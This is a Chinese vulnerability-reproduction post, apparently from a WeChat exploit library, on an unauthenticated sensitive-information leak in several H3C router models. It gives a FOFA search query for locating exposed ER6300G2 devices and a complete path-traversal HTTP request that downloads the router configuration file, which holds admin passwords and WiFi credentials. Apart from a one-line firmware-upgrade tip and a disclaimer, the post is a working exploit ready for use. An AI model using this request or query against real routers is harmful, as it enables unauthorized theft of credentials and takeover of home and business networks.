#  H3C路由器敏感信息泄露漏洞 附POC  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-02-24 03:04  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何  
直接或者间接的后  
果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
  
01  
  
—  
  
漏洞名称  
# H3C路由器敏感信息泄露漏洞  
#   
  
02  
  
—  
  
影响版本  
  
**影响范围**  
：  
涉及H3C ER6300G2、ER5200G2、GR2200、ER8300G2-X、H100等多款路由器型号。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS3AbsKCiaq0g20DleDytDLiazHDibiaO5icic6OmFIzKpUE31OqFIDOkTwBQCuZsc13A3OkfviadhhgpC4fSrrh2Gzuic0TXtCWpjsYm44/640?wx_fmt=png&from=appmsg "")  
  
  
03  
  
—  
  
漏洞简介  
  
H3C路由  
器是新华  
三集团  
推出的网络设备，涵盖消费级、企业级等多种类型，广泛应用于家庭、中小企业及大型  
企业网络环境。  
H3C路由器凭借其高性能、高可靠性和丰富的功能，为不同规模的网络提供了全面  
的解决方案，满足用户对网络速度、覆盖范围、安全性和管理便捷性的需求。  
攻击者可通过特定路径访问路由器配置文件，未经身份验证即可获取后台账号、密码、WiFi名称及密码等敏感信息，进而控制路由器或进行内网渗透。  
  
04  
  
—  
  
资产测绘  
```
app="H3C-Ent-Router" && title=="ER6300G2系统管理"
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS2ZfYb4tAZGtBs1hEN3UIib477SyBheN2IShgLowK28EX12CpUeTWsdwswJaicaUuxGjTrd7UHXEEpLIT2qhAUTAQgPmibUHwNPEM/640?wx_fmt=png&from=appmsg "")  
  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
  
```
GET /userLogin.asp/../actionpolicy_status/../ER6300G2.cfg HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS0JGGFdywVqHq0GicA9kzRMFAQnEvibMAiautmj5b0iaicIBxOKBGcQqAUBAXEib1rP0IvajGr7PZVe1VSgCSM3w1eI4UQ0Df9gicBD3A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS1gr9x7TqZgQDSrAHkeVavWu4BGamvkHzAHOUbT6PTht0r42NP5zKjnyjEL4LJ22QgapGGojhKiaiboWWZmxynYXIgYZlbicgm8Ec/640?wx_fmt=png&from=appmsg "")  
  
  
06  
  
—  
  
修复建议  
  
升级路由器固件至最新版本  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
  
